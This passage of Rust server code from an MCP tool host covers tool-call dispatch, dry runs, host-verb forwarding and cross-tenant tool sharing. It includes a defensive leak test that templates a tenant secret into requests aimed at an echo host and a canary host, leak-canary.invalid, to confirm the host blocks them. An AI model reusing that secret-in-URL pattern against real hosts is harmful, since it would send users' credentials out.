        if let (Some(obj), Some(clamped)) = (out.as_object_mut(), create.clamped_to) {
            obj.insert("clamped_to".to_string(), json!(clamped));
            obj.insert("data".to_string(), json!({"clamped_to": clamped}));
        }
        Ok(out)
    }

    /// PRD-mcphost-example-from-published-tool R1-R3/R6: `host.example.propose`.
    /// The proof call runs through [`Self::host_tool_call`], so a slow tool
    /// costs the proposer's own budget.
    async fn example_propose(&self, tenant: &Tenant, args: Value) -> Result<Value, AppError> {
        let req = crate::example_propose::parse(&args)?;
        let prepared = crate::example_propose::precheck(&self.state, tenant, &req).await?;
        let deadline = std::time::Instant::now() + std::time::Duration::from_millis(crate::example_propose::PROOF_BUILD_WAIT_MS);
        let outcome = loop {
            let call = json!({"name": req.tool, "args": req.proof_args});
            let result = self.host_tool_call(tenant, call, "key", None).await;
            let building = match &result {
                Err(e) => e.code() == "tool_building",
                Ok(v) => v.get("status") == Some(&json!("building")),
            };
            if !building || std::time::Instant::now() >= deadline {
                break result;
            }
            tokio::time::sleep(std::time::Duration::from_millis(50)).await;
        };
        crate::example_propose::finish(&self.state, tenant, &req, prepared, outcome).await
    }

    /// PRD-mcphost-secret-non-exfiltration-proof R4: `host.secret.leak_test`.
    /// Publishes two transient http fixtures (an echo leg and an egress leg
    /// aimed at `leak-canary.invalid`), calls each through the ordinary tool
    /// path (so the `calls` rows are real), removes them, and reports
    /// whether the host blocked each leak.
    async fn secret_leak_test(
        &self,
        tenant: &Tenant,
        args: Value,
        auth_method: &str,
        end_user: Option<&crate::enduser::EndUser>,
    ) -> Result<Value, AppError> {
        use crate::leakguard::{FIXTURE_PREFIX, LEAK_CANARY_HOST, LEAK_ECHO_HOST};
        let secret = args
            .get("name")
            .and_then(Value::as_str)
            .ok_or_else(|| AppError::InvalidArgs("missing required argument 'name'".into()))?
            .to_string();
        if !crate::leakguard::is_secret_name(&secret) {
            return Err(AppError::InvalidArgs(format!(
                "name: '{secret}' must match {} to be referenced as secret.<name>",
                crate::leakguard::SECRET_NAME_PATTERN
            )));
        }
        if !self.state.db.list_secret_names(tenant.id).await?.contains(&secret) {
            return Err(AppError::InvalidArgs(format!(
                "name: no secret '{secret}'; set it with host.secret.set first"
            )));
        }
        let bound_hosts = self.state.db.secret_hosts(tenant.id).await?.remove(&secret);
        let echo_target = match args.get("echo_url").and_then(Value::as_str) {
            Some(url) => url.to_string(),
            None => format!("https://{LEAK_ECHO_HOST}/echo"),
        };
        let plan = self.state.plans.get(&tenant.plan).ok_or_else(|| {
            AppError::Internal(format!("tenant's plan '{}' is not in the loaded plan catalog", tenant.plan))
        })?;
        let versions_max = plan.versions_max;

        let nonce = format!("{:016x}", rand::random::<u64>());
        let echo_name = format!("{FIXTURE_PREFIX}{nonce}_echo");
        let egress_name = format!("{FIXTURE_PREFIX}{nonce}_egress");
        let echo_spec = json!({
            "method": "POST",
            "url": echo_target,
            "body": {"k": format!("{{{{ secret.{secret} }}}}")},
            "args_schema": {"type": "object"},
        });
        let egress_spec = json!({
            "method": "GET",
            "url": format!("https://{LEAK_CANARY_HOST}/?k={{{{ secret.{secret} }}}}"),
            "args_schema": {"type": "object"},
        });

        let run = async {
            self.state
                .db
                .upsert_tool(tenant.id, echo_name.clone(), "http".into(), echo_spec, versions_max, vec![])
                .await?;
            let echo_result = self
                .call_published_tool(tenant, &echo_name, json!({}), false, None, None, end_user, auth_method, None)
                .await;
            let echo = match &echo_result {
                Err(e) if e.code() == "secret_leak_blocked" => "blocked",
                Err(_) => "error",
                Ok(_) => "LEAKED",
            };
            // An unbound secret may go anywhere by design, so the egress leg
            // is not sent for it (the canary would be a real request).
            let egress = if bound_hosts.is_none() {
                "unbound"
            } else {
                self.state
                    .db
                    .upsert_tool(tenant.id, egress_name.clone(), "http".into(), egress_spec, versions_max, vec![])
                    .await?;
                match self
                    .call_published_tool(tenant, &egress_name, json!({}), false, None, None, end_user, auth_method, None)
                    .await
                {
                    Err(e) if e.code() == "secret_leak_blocked" => "blocked",
                    _ => "LEAKED",
                }
            };
            Ok::<_, AppError>((echo, egress))
        };
        let outcome = run.await;
        // The fixtures never outlive the call, whatever happened above.
        let _ = self.state.db.remove_tool(tenant.id, echo_name).await;
        let _ = self.state.db.remove_tool(tenant.id, egress_name).await;
        let (echo, egress) = outcome?;

        let report = json!({
            "echo": echo,
            "egress": egress,
            "bound_hosts": bound_hosts.unwrap_or_default(),
            "checked_at": crate::state::now_unix(),
        });
        if echo == "LEAKED" || egress == "LEAKED" {
            return Err(AppError::Structured {
                code: crate::leakguard::LEAK_TEST_FAILED,
                message: format!("secret '{secret}' was not blocked (echo: {echo}, egress: {egress})"),
                data: report,
            });
        }
        Ok(report)
    }

    async fn host_tool_call(
        &self,
        tenant: &Tenant,
        args: Value,
        auth_method: &str,
        end_user: Option<&crate::enduser::EndUser>,
    ) -> Result<Value, AppError> {
        // PRD-mcphost-data-retention requirement 4 (AC6): refuse before
        // any write when free space on the database's filesystem is under
        // the configured floor.
        if !self.state.disk_guard.is_ok(self.state.db.data_dir()) {
            return Err(AppError::disk_floor(
                self.state.disk_guard.free_bytes(self.state.db.data_dir()),
                self.state.disk_guard.floor_bytes(),
            ));
        }
        let name = args
            .get("name")
            .and_then(Value::as_str)
            .ok_or_else(|| AppError::InvalidArgs("missing required argument 'name'".into()))?
            .to_string();
        let call_args = args
            .get("args")
            .cloned()
            .unwrap_or_else(|| Value::Object(Default::default()));
        // PRD-mcphost-tool-versions requirement 5: a sibling of `args`/
        // `name`, not folded into the call args themselves (unlike the
        // cross-tenant `<owner_ns>.<name>` path, where the wire arguments
        // object IS the call args and `version` has to be a reserved key
        // inside it -- see the dispatch match arm below).
        let version = args.get("version").and_then(Value::as_i64);
        let is_async = args.get("async").and_then(Value::as_bool) == Some(true);
        // PRD-mcphost-run-budget-governor requirement 3 (AC3): validated
        // before any dispatch (sync or async) -- a `budget` above the
        // plan's own ceiling never starts a run. Every call reaching this
        // point already has a loaded plan row (`tenant.plan` is set at
        // signup and never points at an unregistered plan).
        let budget_arg = args.get("budget");
        let dry_run = args.get("dry_run").and_then(Value::as_bool) == Some(true);
        if dry_run {
            return self.dry_run_call(tenant, &name, call_args, &args).await;
        }
        // PRD-mcphost-call-cost-estimate: the budget ceiling is the
        // `PreResolve` row of `PREFLIGHT_CHECKS`; the rest run inside
        // `call_published_tool` once the tool is resolved.
        let preflight_ctx = crate::preflight::Ctx {
            state: &self.state,
            mode: crate::preflight::Mode::Real,
            owner: tenant,
            caller: None,
            tool: &name,
            args: &call_args,
            budget: budget_arg,
            target: None,
        };
        crate::preflight::run_stage(&preflight_ctx, crate::preflight::Stage::PreResolve)
            .await
            .map_err(|refusal| refusal.err)?;
        // AC15: `call_published_tool`'s `get_tool` lookup is already scoped
        // to `tenant.id`, so a name only some other tenant published simply
        // isn't found here -- `ToolNotFound`, with nothing in the error to
        // distinguish "never published by anyone" from "published by
        // someone else".
        //
        // PRD-mcphost-shared-tool-call-path requirement 1/3 (AC1, AC4, AC7,
        // AC9): `<owner_ns>.<local>` is now accepted here too, resolved
        // exactly the way raw `tools/call` resolves it in the dispatch match
        // arm below -- the caller's own namespace short-circuits straight to
        // `call_published_tool`/`runs::enqueue` (no sharing lookup,
        // resolving to the local tool regardless of its own visibility, per
        // this PRD's own "at build" open question), any other namespace
        // goes through `call_shared_tool`/`runs::enqueue_shared`, the same
        // functions raw dispatch already uses, so metering/quota/audit
        // behavior is identical either way.
        // PRD-mcphost-tool-call-host-verb-forward Non-goals: an `admin.*`/
        // `billing.*` name is never forwarded, whatever the verb registry
        // says -- refused immediately, before any tenant-tool/shared-tool
        // lookup, so no DB round trip is ever spent on it and (AC4) no
        // admin verb is ever one dispatch away from an agent that merely
        // guessed at a dotted name.
        if name.starts_with("admin.") || name.starts_with("billing.") {
            return Err(AppError::host_verb_not_forwarded(&name, &call_args));
        }

        // Technical considerations: "resolve tenant tools first, forward
        // only on a miss" -- the exact pre-existing resolution below
        // (own-namespace local tool, cross-tenant shared tool, or a bare
        // local name) runs unchanged and unconditionally first, so a
        // tenant tool that happens to be named like a verb (AC3) always
        // wins. Only a `tool_not_found`-coded miss (both
        // `AppError::ToolNotFound` and `sharing::resolve_shared_tool`'s own
        // `shared_tool_not_found` carry that code) falls through to
        // verb-forwarding below.
        let dispatch_args = call_args.clone();
        // PRD-mcphost-call-trace-replay requirement 1: the `calls.id` the
        // dispatch below writes comes back through this slot.
        let (result, call_id): (Result<Value, AppError>, Option<i64>) =
            crate::calltrace::with_call_id_slot(async { match name.split_once('.') {
            Some((ns, local)) if ns == tenant.namespace => {
                if is_async {
                    crate::runs::enqueue(&self.state, tenant, local, dispatch_args, end_user, budget_arg).await
                } else {
                    self.call_published_tool(tenant, local, dispatch_args, false, None, version, end_user, auth_method, None)
                        .await
                }
            }
            Some((ns, local)) => {
                if is_async {
                    crate::runs::enqueue_shared(&self.state, tenant, ns, local, dispatch_args, budget_arg).await
                } else {
                    self.call_shared_tool(tenant, ns, local, dispatch_args, false, version, end_user, auth_method)
                        .await
                }
            }
            None => {
                if is_async {
                    crate::runs::enqueue(&self.state, tenant, &name, dispatch_args, end_user, budget_arg).await
                } else {
                    self.call_published_tool(tenant, &name, dispatch_args, false, None, version, end_user, auth_method, None)
                        .await
                }
            }
        } }).await;
        let result = match call_id {
            Some(id) => crate::calltrace::attach_call_id(result, id),
            None => result,
        };

        match result {
            Ok(value) => Ok(value),
            Err(err) if err.code() == "tool_not_found" => {
                match crate::verbforward::resolve(&name, &self.state.kinds) {
                    Some(canonical) if crate::verbforward::is_denylisted(&canonical) => {
                        Err(AppError::host_verb_not_forwarded(&canonical, &call_args))
                    }
                    Some(canonical) => {
                        self.forward_host_verb(tenant, &canonical, call_args, auth_method, end_user).await
                    }
                    None if name.starts_with("host.") => Err(unknown_host_tool(&self.state.kinds, &name)),
                    None => Err(err),
                }
            }
            Err(err) => Err(err),
        }
    }

    /// PRD-mcphost-call-cost-estimate requirement 2: `host.tool_call` with
    /// `dry_run: true` (and `host.estimate`). Walks the same path the real
    /// call does -- `PREFLIGHT_CHECKS` `PreResolve`, tool/shared-tool
    /// resolution, `Resolved` -- but never dispatches, writes no `calls`
    /// row (no `refuse`), and holds no capacity slot. A refusal comes back
    /// as data (`refusal`), built by the same `AppError -> ErrorData`
    /// conversion the real refusal goes through.
    async fn dry_run_call(
        &self,
        tenant: &Tenant,
        name: &str,
        call_args: Value,
        args: &Value,
    ) -> Result<Value, AppError> {
        use crate::preflight::{Ctx, Mode, Stage, resolve, run_stage};
        let version = args.get("version").and_then(Value::as_i64);
        let budget_arg = args.get("budget");
        let verdict: Result<(), AppError> = async {
            let pre = Ctx {
                state: &self.state,
                mode: Mode::DryRun,
                owner: tenant,
                caller: None,
                tool: name,
                args: &call_args,
                budget: budget_arg,
                target: None,
            };
            run_stage(&pre, Stage::PreResolve).await.map_err(|r| r.err)?;
            if name.starts_with("admin.") || name.starts_with("billing.") {
                return Err(AppError::host_verb_not_forwarded(name, &call_args));
            }
            let (owner, caller, local): (Tenant, Option<&Tenant>, &str) = match name.split_once('.') {
                Some((ns, local)) if ns == tenant.namespace => (tenant.clone(), None, local),
                Some((ns, local)) => {
                    match crate::sharing::resolve_shared_tool(&self.state, tenant, ns, local, crate::sharing::ShareScope::Call).await {
                        Ok((owner, _row)) => (owner, Some(tenant), local),
                        Err(err) => return self.dry_run_unresolved(name, &call_args, err),
                    }
                }
                None => (tenant.clone(), None, name),
            };
            let target = match resolve(&self.state, &owner, local, version, None).await {
                Ok(target) => target,
                Err(r) => return self.dry_run_unresolved(name, &call_args, r.err),
            };
            let ctx = Ctx {
                state: &self.state,
                mode: Mode::DryRun,
                owner: &owner,
                caller,
                tool: local,
                args: &call_args,
                budget: None,
                target: Some(&target),
            };
            run_stage(&ctx, Stage::Resolved).await.map_err(|r| r.err)
        }
        .await;
        let refusal = match verdict {
            Ok(()) => Value::Null,
            // A storage/internal failure is not an admission verdict.
            Err(err) if matches!(err.code(), "storage" | "internal") => return Err(err),
            Err(err) => {
                // PRD-mcphost-onboarding-dead-ends-zero R1: the same
                // `data.tool` (so the same `next_call`) the real call's
                // `ran_tool` gives this refusal.
                let err = err.with_tool(crate::next_call::caller_tool_name(&tenant.namespace, name));
                let data = err.into_error_data_at(Some(&self.state.public_url));
                json!({
                    "code": data.data.as_ref().and_then(|d| d.get("error_code")).cloned().unwrap_or(Value::Null),
                    "message": data.message,
                    "data": data.data,
                })
            }
        };
        self.state.estimates.record(tenant.id);
        let daily = crate::preflight::daily_calls(&self.state, tenant).await?;
        Ok(json!({
            "dry_run": true,
            "fits": refusal.is_null(),
            "units": {"calls": 1},
            "remaining": {"calls_per_day": {
                "used": daily.used,
                "limit": daily.limit,
                "remaining": daily.remaining(),
                "resets_at": daily.resets_at(),
            }},
            "refusal": refusal,
            "not_checked": ["kind_call"],
            "see": crate::budget::BUDGET_CEILING_SEE,
        }))
    }

    /// The dry run's twin of `host_tool_call`'s `tool_not_found` fallthrough:
    /// a miss on tenant/shared tools is tried as a host verb. A forwardable
    /// verb has no admission list of its own, so it fits; anything else is
    /// the error the real call would return.
    fn dry_run_unresolved(&self, name: &str, call_args: &Value, err: AppError) -> Result<(), AppError> {
        if err.code() != "tool_not_found" {
            return Err(err);
        }
        match crate::verbforward::resolve(name, &self.state.kinds) {
            Some(canonical) if crate::verbforward::is_denylisted(&canonical) => {
                Err(AppError::host_verb_not_forwarded(&canonical, call_args))
            }
            Some(_) => Ok(()),
            None if name.starts_with("host.") => Err(unknown_host_tool(&self.state.kinds, name)),
            None => Err(err),
        }
    }

    /// PRD-mcphost-tool-call-host-verb-forward requirement 1 (AC1, AC2):
    /// `host_tool_call`'s own fallback once the tenant/shared-tool lookup
    /// above misses and `name` normalizes to a real, forwardable host verb.
    /// Dispatches through the exact same `dispatch_tenant_tool` match every
    /// direct `host.*` call goes through, so the result is byte-identical
    /// to calling `canonical` directly, then tags the success with
    /// `forwarded_to`/`client_tool` and records usage with `via:
    /// "tool_call"` (requirement 2) -- distinct from the generic per-call
    /// `record_host_tool_use` `maybe_attach_next_hint` already does for the
    /// wrapper call itself. Never touches the tenant's tool-call quota or
    /// the `calls` table: those only ever happen inside
    /// `call_published_tool`/`call_shared_tool`, neither of which this path
    /// reaches.
    ///
    /// `subject: None, auth_method: "key"`: same rationale as
    /// [`TenantHostStepBridge`]'s own doc comment -- of every forwardable
    /// verb, only `host.whoami` (never allowlisted there either) reads
    /// either parameter, and a hint-misrouted call has no chain-step
    /// identity of its own to lose by not re-deriving it here.
    #[allow(clippy::too_many_arguments)]
    async fn forward_host_verb(
        &self,
        tenant: &Tenant,
        canonical: &str,
        call_args: Value,
        calls_auth_method: &str,
        end_user: Option<&crate::enduser::EndUser>,
    ) -> Result<Value, AppError> {
        // `Box::pin`: `dispatch_tenant_tool` -> `host_tool_call` ->
        // `forward_host_verb` -> `dispatch_tenant_tool` is a real cycle in
        // the type graph (rustc can't see that `canonical` is never one of
        // the two `host.tool.*` arms that would re-enter `host_tool_call`),
        // so the recursive `async fn` needs one Box indirection to have a
        // known size.
        let mut value = Box::pin(self.dispatch_tenant_tool(
            tenant,
            None,
            "key",
            calls_auth_method,
            end_user,
            None,
            canonical,
            call_args,
        ))
        .await?;
        if let Some(obj) = value.as_object_mut() {
            obj.insert("forwarded_to".to_string(), json!(canonical));
            obj.insert(
                "client_tool".to_string(),
                json!(crate::verbforward::client_tool_name(canonical)),
            );
        }
        if let Err(e) = self
            .state
            .db
            .record_host_tool_use(tenant.id, canonical.to_string(), "tool_call".to_string(), now_unix())
            .await
        {
            tracing::warn!(tenant = %tenant.namespace, error = %e, "record_host_tool_use failed");
        }
        Ok(value)
    }

    /// PRD-mcphost-tool-call-host-verb-forward requirement 3 (AC5):
    /// `host.tool_test`'s own fallback once the published-tool lookup
    /// above misses and `name` normalizes to a real, forwardable host
    /// verb. A [`crate::verbforward::DRY_RUN_FORWARDABLE`] verb gets a real
    /// dry run -- the same savepoint `dryrun::with_dry_run` scope
    /// `host.tool_test` already opens for a published tool's `kind.call`,
    /// so the verb's own `state.db.*` writes land in the dedicated,
    /// rolled-back connection (`db::Db::with_conn`'s own dry-run branch)
    /// instead of the real one. Every other verb has no dry run yet:
    /// `unverifiable`, naming the same `call_instead` a denylisted verb's
    /// refusal does, and nothing is ever dispatched for it.
    async fn test_forward_host_verb(
        &self,
        tenant: &Tenant,
        canonical: &str,
        call_args: Value,
    ) -> Result<Value, AppError> {
        if !crate::verbforward::supports_dry_run(canonical) {
            let client_tool = crate::verbforward::client_tool_name(canonical);
            return Err(AppError::Structured {
                code: UNVERIFIABLE,
                message: format!("{canonical} has no dry run yet -- call it for real to verify"),
                data: json!({
                    "host_verb": canonical,
                    "call_instead": {"tool": client_tool, "args": call_args},
                }),
            });
        }
        let dry_run = crate::dryrun::DryRunCtx::new(self.state.db.path().to_path_buf(), self.state.db.cfg());
        // `Box::pin`: see `forward_host_verb`'s own doc comment -- the same
        // `dispatch_tenant_tool` <-> `host.tool_test`/`host.tool_call`
        // recursion, through `tool_test` this time.
        let outcome = crate::dryrun::with_dry_run(
            dry_run.clone(),
            Box::pin(self.dispatch_tenant_tool(tenant, None, "key", "key", None, None, canonical, call_args)),
        )
        .await;
        // Rolled back regardless of outcome, same as `host.tool_test`'s own
        // published-tool path below.
        crate::dryrun::finish(dry_run.clone()).await;
        let mut value = outcome?;
        if let Some(obj) = value.as_object_mut() {
            obj.insert("forwarded_to".to_string(), json!(canonical));
            crate::envelope::default_dry_run(obj, || {
                json!({"writes": dry_run.writes(), "delivered": false, "rolled_back": true})
            });
        }
        Ok(value)
    }

    /// PRD-mcphost-sharing P0 requirement 2 (AC1-3): resolve `<owner_ns>.
    /// <local_name>` for `caller` (a tenant other than `owner_ns`). Success
    /// requires the owner's tool to exist AND be `public`, or `group` with
    /// `caller` a member of that group -- any other case (owner doesn't
    /// exist, tool doesn't exist, tool is private, or `caller` isn't in the
    /// group) is `ToolNotFound`, indistinguishably from each other, so a
    /// probe never learns whether a private tool of that name exists
    /// (requirement 2: "never revealing whether the tool exists").
    // Six parameters: one resolve-then-dispatch path with a single caller
    // (`call_tool`'s cross-tenant arm) -- same shape as
    // `call_published_tool` above.
    #[allow(clippy::too_many_arguments)]
    async fn call_shared_tool(
        &self,
        caller: &Tenant,
        owner_ns: &str,
        local_name: &str,
        args: Value,
        mcp_name_mismatch: bool,
        version: Option<i64>,
        end_user: Option<&crate::enduser::EndUser>,
        auth_method: &str,
    ) -> Result<Value, AppError> {
        let (owner, _row) =
            crate::sharing::resolve_shared_tool(&self.state, caller, owner_ns, local_name, crate::sharing::ShareScope::Call).await?;

        self.call_published_tool(
            &owner,
            local_name,
            args,
            mcp_name_mismatch,
            Some(caller),
            version,
            end_user,
            auth_method,
            None,
        )
        .await
    }

    /// The visibility half of [`Self::call_shared_tool`]'s resolution,
    /// pulled out so PRD-mcphost-shared-tool-spec-readback's `host.
    /// tool_spec_shared` (below) can reuse the exact same "public, or
    /// group with `caller_id` a member" rule instead of a second resolver
    /// (technical considerations: "reuse the share membership check").
    async fn tool_visible_to(
        &self,
        owner_id: i64,
        row: &crate::db::ToolRow,
        caller_id: i64,
    ) -> Result<bool, AppError> {
        Ok(match row.visibility.as_str() {
            "public" | "unlisted" => true,
            "group" => match &row.shared_group {
                Some(group) => {
                    self.state
                        .db
                        .is_group_member(owner_id, group.clone(), caller_id)
                        .await?
                }
                None => false,
            },
            _ => false,
        })
    }

    /// PRD-mcphost-shared-tool-spec-readback P0 requirement 2/4 (AC1-AC6):
    /// `host.tool_spec_shared(tool: "<owner_ns>.<name>")` -- resolves and
    /// checks visibility exactly like `call_shared_tool` above, then a
    /// second gate unique to this tool: `row.expose_spec`. A tool that
    /// exists but isn't shared with `caller` at all is `ToolNotFound`,
    /// byte-identical to `call_shared_tool`'s own refusal (requirement 4/
    /// AC5: "never leak that the tool exists"); shared but not exposed is
    /// the distinct `spec_not_exposed` (AC4), which does name the tool --
    /// the caller already knows it exists, since it was shared with them.
    async fn tool_spec_shared(&self, caller: &Tenant, args: Value) -> Result<Value, AppError> {
        let tool = args
            .get("tool")
            .and_then(Value::as_str)
            .ok_or_else(|| AppError::InvalidArgs("missing required argument 'tool'".into()))?;
        let (owner_ns, local_name) = tool.split_once('.').ok_or_else(|| {
            AppError::InvalidArgs("'tool' must be '<owner_namespace>.<name>'".into())
        })?;
        let owner_ns = owner_ns.to_string();
        let local_name = local_name.to_string();

        // Requirement 7: no new quota -- the same per-tenant daily call
        // quota `host.tool_call`'s cross-tenant path checks, against the
        // caller (not the owner).
        crate::preflight::check_calls_per_day(&self.state, caller, crate::preflight::Mode::Real).await?;

        // AC5: byte-identical to `call_shared_tool`'s own not-found shape
        // (now `crate::sharing::resolve_shared_tool`'s `shared_tool_not_found`),
        // not a bare `ToolNotFound`.
        let not_found = || AppError::shared_tool_not_found(&owner_ns, &local_name);
        // Requirement 3's technical considerations: reuse the share
        // membership check `call_shared_tool` uses (`tool_visible_to`), but
        // via `get_tool_owner_id_by_namespace`'s single-query resolution
        // rather than `call_shared_tool`'s own `get_tool_by_owner_namespace`
        // -- this path never needs the owner's full `Tenant` (only its id),
        // and AC8's 50-concurrent-readers p95 budget makes every serialized
        // round trip through the one `Mutex<Connection>` count.
        let (owner_id, row) = self
            .state
            .db
            .get_tool_owner_id_by_namespace(owner_ns.clone(), local_name.clone())
            .await?
            .ok_or_else(not_found)?;

        if !self.tool_visible_to(owner_id, &row, caller.id).await? {
            return Err(not_found());
        }
        if !row.expose_spec {
            return Err(AppError::spec_not_exposed(&owner_ns, &local_name));
        }
        // PRD-mcphost-scoped-tool-share R3: the spec readback needs the
        // `read_source` scope (`fork` implies it).
        let granted = self
            .state
            .db
            .get_share_meta(owner_id, local_name.clone())
            .await?
            .and_then(|m| m.scopes)
            .unwrap_or_else(crate::sharing::ShareScope::legacy_default);
        if !crate::sharing::ShareScope::ReadSource.granted_in(&granted) {
            return Err(crate::sharing::scope_missing(crate::sharing::ShareScope::ReadSource, &granted));
        }

        let started = Instant::now();
        let spec = self
            .state
            .kinds
            .get(&row.kind)
            .map(|kind| kind.redacted_spec_for_sharing(&row.spec))
            .unwrap_or_else(|| json!({}));

        // AC9: only a successful read (both gates passed) bumps the
        // owner-visible counter. This one *is* awaited: AC9's test reads
        // three sharee responses fully sequentially, then immediately
        // checks `host.tool_list` -- a fire-and-forget write here could
        // still be in flight when that check runs.
        self.state.db.record_spec_read(owner_id, local_name.clone()).await?;
        let duration_ms = started.elapsed().as_millis() as i64;
        // Requirement 7 continued: this row is what makes the read count
        // against `caller`'s quota on its next check (`count_calls_since`
        // matches on `caller_tenant_id`, only for `ok = 1` rows). Detached
        // (AC8: 50 concurrent readers must not each wait on a second
        // serialized write through the single `Mutex<Connection>` --
        // requirement 7's quota bookkeeping only has to land before the
        // caller's *next* call, not before this response). The owner's
        // `origin`/`origin_detail` (for the calls-log row, admin-reporting
        // metadata only) are looked up here rather than kept from a
        // critical-path `Tenant` fetch, since this whole block already
        // isn't on that path.
        let state = self.state.clone();
        let owner_ns_bg = owner_ns.clone();
        let owner_tool_name = local_name.clone();
        let caller_id = caller.id;
        tokio::spawn(async move {
            let Ok(Some(owner)) = state.db.find_tenant_by_namespace(owner_ns_bg).await else {
                return;
            };
            let _ = state
                .db
                .record_call_attributed(
                    owner_id,
                    owner_tool_name,
                    duration_ms,
                    true,
                    None,
                    None,
                    None,
                    "ok",
                    owner.origin,
                    owner.origin_detail,
                    Some(caller_id),
                )
                .await;
        });

        Ok(json!({
            "tool": format!("{owner_ns}.{local_name}"),
            "kind": row.kind,
            "spec": spec,
            "exposed_at": row.spec_exposed_unix.map(crate::state::rfc3339_from_unix),
        }))
    }
}

impl McpHostHandler {
    /// The auth a listing request (`tools/list`, `prompts/list`) is served
    /// under: path secret, then header, then the session's bound tenant,
    /// refusing a tenant whose namespace is not the `/t/{ns}/mcp` path's.
    async fn resolve_listing_auth(
        &self,
        parts: &http::request::Parts,
    ) -> Result<(Auth, Option<crate::subkeys::SubKey>), McpError> {
        // PRD-mcphost-url-bound-tenants requirement 1: same highest-
        // precedence path-secret step `call_tool` uses, so a `tools/list` on
        // a `/u/{secret}/mcp` connection sees that tenant's own tools too.
        let mut sub_key: Option<crate::subkeys::SubKey> = None;
        let mut auth = match resolve_path_secret_auth(&self.state, parts, "")
            .await
            .map_err(|e| e.into_error_data_at(Some(&self.state.public_url)))?
        {
            Some(a) => a,
            None => {
                resolve_auth(&self.state, parts, &mut sub_key, "")
                    .await
                    .map_err(|e| e.into_error_data_at(Some(&self.state.public_url)))?
            }
        };
        // PRD-mcphost-one-next-tool requirement 2/3 (AC2, AC3): `tools/list`
        // carries no `tenant_key` argument of its own, but a session this
        // PRD's starter set would otherwise narrow may already be bound to a
        // tenant (`signup`/`host.redeem` on this same session -- see
        // `bind_session_to_created_tenant`) -- that session must keep seeing
        // the full listing with no reconnect, same precedence `call_tool`
        // already gives the binding (only consulted when the header found
        // nothing at all).
        if matches!(auth, Auth::Anonymous)
            && let Some(session_id) = session_id(parts)
            && let Some(bound) = resolve_session_binding(&self.state, &session_id, "")
                .await
                .map_err(|e| e.into_error_data_at(Some(&self.state.public_url)))?
        {
            auth = bound;
        }
        // PRD-mcphost-tenant-resource-metadata requirement 1 (AC3): a real
        // tenant whose namespace doesn't match a `/t/{ns}/mcp` path's own
        // `<ns>` never gets even a tool listing for it.
        if let Auth::Tenant(tenant, _) = &auth
            && let Some(ns) = tenant_path_namespace(parts)
            && tenant.namespace != ns
        {
            return Err(AppError::WrongTenant.into_error_data_at(Some(&self.state.public_url)));
        }
        Ok((auth, sub_key))
    }

    /// The tenant's prompt-kind tools as `(prompt, spec, kind)` rows, under
    /// the exact scope filter `list_tools` applies.
    async fn tenant_prompt_rows(
        &self,
        tenant: &Tenant,
        oauth_caller: &Option<crate::oauth::OauthCaller>,
        sub_key: &Option<crate::subkeys::SubKey>,
    ) -> Result<Vec<ToolRow>, McpError> {
        if self.state.kinds.get(crate::prompts::PROMPT_KIND).is_none() {
            return Ok(Vec::new());
        }
        let rows = self
            .state
            .db
            .list_tools(tenant.id)
            .await
            .map_err(|e| e.into_error_data_at(Some(&self.state.public_url)))?;
        let token_scope = oauth_caller.as_ref().and_then(|o| o.scope.as_deref());
        Ok(rows
            .into_iter()
            .filter(|row| row.kind == crate::prompts::PROMPT_KIND)
            .filter(|row| crate::oauth::scope_satisfied(token_scope, &row.scopes))
            .filter(|row| {
                sub_key.as_ref().is_none_or(|sk| {
                    let full = format!("{}.{}", tenant.namespace, row.name);
                    sk.permits(&tenant.namespace, &full) && sk.scope_ok(&full)
                })
            })
            .collect())
    }
}

/// Regression guard (verbfwd_ac01 debug stack overflow, 10-17): upper bound,
/// in bytes, on the debug-build size of `McpHostHandler::dispatch_tenant_tool`'s (the top-level dispatch the dotted-verb path awaits) future. The PRD
/// prompts-from-published-tools bookkeeping once sat inline in
/// `call_tool_inner` and grew this chain until the dotted-verb forward
/// (`host.tool_call name="trigger.set"`) overflowed a 2 MiB test-thread
/// stack. Measured after the fix + ~25 % headroom; if a change trips
/// `future_sizes_stay_under_their_bounds`, move the new awaits into their own
/// `Box::pin`'d `async fn` rather than raising this number.
#[cfg(test)]
const DISPATCH_TENANT_TOOL_FUTURE_MAX_BYTES: usize = 18_600;

impl McpHostHandler {
    /// `dispatch_tenant_tool`, plus PRD-mcphost-prompts-from-published-tools
    /// R4's read of whether a successful `host.tool.publish` /
    /// `host.tool.remove` changed the prompt list (the kind a publish replaces
    /// or a remove deletes is read before the call). Its own `async fn` so
    /// `call_tool_inner` carries none of this in its debug poll frame.
    #[allow(clippy::too_many_arguments)]
    async fn dispatch_tenant_tool_tracking_prompts(
        &self,
        tenant: &Tenant,
        subject: Option<&str>,
        auth_method: &str,
        calls_auth_method: &str,
        end_user: Option<&crate::enduser::EndUser>,
        session_id: Option<&str>,
        name: &str,
        args: Value,
    ) -> (Result<Value, AppError>, bool) {
        let tracked = crate::listen::tracks_prompts(name);
        let kind_before = match (tracked, args.get("name").and_then(Value::as_str)) {
            (true, Some(tool)) => self
                .state
                .db
                .get_tool(tenant.id, tool.to_string())
                .await
                .ok()
                .flatten()
                .map(|row| row.kind),
            _ => None,
        };
        let call_args = tracked.then(|| args.clone());
        let result = self
            .dispatch_tenant_tool(tenant, subject, auth_method, calls_auth_method, end_user, session_id, name, args)
            .await;
        let changed = match (&result, &call_args) {
            (Ok(value), Some(call_args)) => {
                crate::prompts::changes_prompt_list(name, call_args, kind_before.as_deref(), value)
            }
            _ => false,
        };
        if changed {
            self.state.listen_hub.notify(tenant.id, crate::listen::ListChange::Prompts);
        }
        (result, changed)
    }
}

/// Best-effort `notifications/prompts/list_changed`, like the tools one.
async fn notify_prompt_list_changed(peer: &Peer<RoleServer>, namespace: &str) {
    if let Err(e) = crate::protocol::frames::emit(
        peer,
        crate::protocol::frames::Frame::PromptListChanged,
        crate::protocol::frames::request_type_of("tools/call", true),
    )
    .await
    {
        tracing::warn!(tenant = %namespace, error = %e, "notify_prompt_list_changed failed");
    }
}

impl McpHostHandler {
    /// PRD-mcphost-subscriptions-listen R2/R6: the body of `ServerHandler::listen`.
    async fn listen_stream(&self, context: rmcp::service::SubscriptionContext) -> Result<(), McpError> {
        let base = Some(self.state.public_url.as_str());
        let parts = get_parts(context.request_context())?;
        let mut sub_key = None;
        let auth = match resolve_path_secret_auth(&self.state, parts, "")
            .await
            .map_err(|e| e.into_error_data_at(base))?
        {
            Some(a) => a,
            None => resolve_auth(&self.state, parts, &mut sub_key, "")
                .await
                .map_err(|e| e.into_error_data_at(base))?,
        };
        let tenant = match auth {
            Auth::Tenant(tenant, _) => tenant,
